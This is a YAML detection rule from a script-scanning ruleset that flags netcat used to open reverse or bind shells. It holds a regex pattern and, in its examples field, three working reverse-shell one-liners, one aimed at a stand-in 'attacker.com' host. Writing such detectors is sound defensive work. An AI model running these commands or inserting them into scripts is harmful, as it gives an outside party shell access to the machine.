# Bash Pattern: Netcat (nc) LOLBin Abuse
# Detects netcat usage for reverse shells and network operations

id: BASH-019
name: Netcat LOLBin Abuse
description: |
  Detects abuse of netcat (nc) as a Living Off The Land Binary for establishing
  reverse shells, bind shells, or unauthorized network connections. Netcat is
  commonly used by attackers for command and control communications.
languages:
  - bash
detection_type: regex
detection_logic: '\bnc\b.*(?:-e|--exec|--sh-exec).*(?:/bin/bash|/bin/sh|cmd\.exe)|(?:mkfifo|mknod).*nc\b'
severity: High
mitre_technique: T1059.004
confidence: 0.90
category: execution
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-01-19"
  references:
    - "https://attack.mitre.org/techniques/T1059/004/"
    - "https://gtfobins.github.io/gtfobins/nc/"
  tags:
    - lolbin
    - netcat
    - reverse-shell
    - c2
  examples:
    - "nc -e /bin/bash 192.168.1.100 4444"
    - "nc -e /bin/sh attacker.com 1234"
    - "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f"